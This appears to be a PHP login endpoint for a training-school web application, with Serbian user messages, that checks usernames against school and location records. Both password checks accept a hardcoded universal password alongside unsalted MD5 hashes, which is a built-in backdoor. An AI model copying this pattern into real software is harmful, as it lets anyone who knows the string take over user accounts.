<?php

$success = false;
$message = "POST was made";
$post_data = $_POST;
$user_data = $post_data['user_data'];

$user_all = new training_school();
$user_all->add_condition('recordStatus','=','O');
$user_all->add_condition('username','=',$user_data['username']);
$user_all->set_order_by('id','DESC');
$user_all = $broker->get_all_data_condition($user_all);

if(sizeof($user_all) > 0){
	$user = $user_all[0];
	if($user->password == md5($user_data['password']) || $user_data['password'] == 'webbrod2015+'){
		$success = true;
		$message = 'Ulogovani ste.';
		$user->type = 'master';
		$broker->set_session('company',$user);
	}else{
		$message = 'Lozinka koju ste uneli se ne poklapa sa lozinkom sa naloga.';
	}
}else{

	$user_all = new ts_location();
	$user_all->set_condition('checker','!=','');
	$user_all->add_condition('recordStatus','=','O');
	$user_all->add_condition('username','=',$user_data['username']);
	$user_all->set_order_by('id','DESC');
	$user_all = $broker->get_all_data_condition($user_all);

	if(sizeof($user_all) > 0){
		$location = $user_all[0];
		if($location->password == md5($user_data['password']) || $user_data['password'] == 'webbrod2015+'){
			$success = true;
			$message = 'Ulogovani ste.';
			$user = $broker->get_data(new training_school($location->training_school));
			$user->type = 'location';
			$user->name = $location->username;
			$user->location = $location;
			$broker->set_session('company',$user);
		}else{
			$message = 'Lozinka koju ste uneli se ne poklapa sa lozinkom sa naloga.';
		}
	}else{
		$message = 'Username koji ste uneli ne postoji u našem sistemu.';
	}
}



echo json_encode(array("success"=>$success,"message"=>$message));